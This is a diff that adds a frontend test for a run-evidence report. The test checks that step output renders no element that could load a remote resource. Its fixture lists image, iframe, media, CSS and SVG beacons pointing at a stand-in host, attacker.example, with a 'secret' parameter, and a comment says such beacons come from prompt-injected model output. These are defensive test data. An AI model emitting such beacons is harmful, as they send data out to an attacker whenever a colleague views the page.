@@ -479,6 +479,38 @@ describe("RunEvidenceReport 296-04: step output renders as sanitised markdown (2
   })
 })
 
+describe("RunEvidenceReport 296 review FE-WR-02: step output fetches nothing remote at render", () => {
+  // A prompt-injected output can plant an image beacon; on this page a COLLEAGUE's browser would
+  // fire it with no click. The report renders no element or attribute that loads a resource.
+  const BEACON = "https://attacker.example/p?d=secret"
+  const hostile = [
+    `Summary ![x](${BEACON})`,
+    `<img src="${BEACON}">`,
+    `<picture><source srcset="${BEACON}"></picture>`,
+    `<video src="${BEACON}" poster="${BEACON}"></video><audio src="${BEACON}"></audio>`,
+    `<iframe src="${BEACON}"></iframe>`,
+    `<div style="background-image:url(${BEACON})">styled</div>`,
+    `<style>body{background:url(${BEACON})}</style>`,
+    `<svg><image href="${BEACON}"></image></svg>`,
+    `<input type="image" src="${BEACON}">`,
+    `[a link](https://example.com/doc)`,
+  ].join("\n\n")
+
+  it("renders no media, style or src-bearing element for a hostile colleague-visible output", async () => {
+    const p = colleaguePayload()
+    p.phase_log[0] = { ...p.phase_log[0], output_text: hostile }
+    renderReport(p)
+    await ready()
+    const row = rows(2)[0]
+    expect(row.querySelector("img, picture, source, video, audio, iframe, style, svg, image, input, object, embed")).toBeNull()
+    expect(row.querySelector("[src], [srcset], [poster], [style]")).toBeNull()
+    expect(row.innerHTML).not.toContain("attacker.example")
+    // Words and links still render.
+    expect(row.textContent ?? "").toContain("Summary")
+    expect(row.querySelector("a")?.getAttribute("href")).toBe("https://example.com/doc")
+  })
+})
+
 describe("RunEvidenceReport 296-04: a run watched into failed announces once (289-F-A)", () => {
   it("with the prop, exactly one sr-only alert carries the band sentence", async () => {
     getRunEvidence.mockResolvedValue(failedPayload())
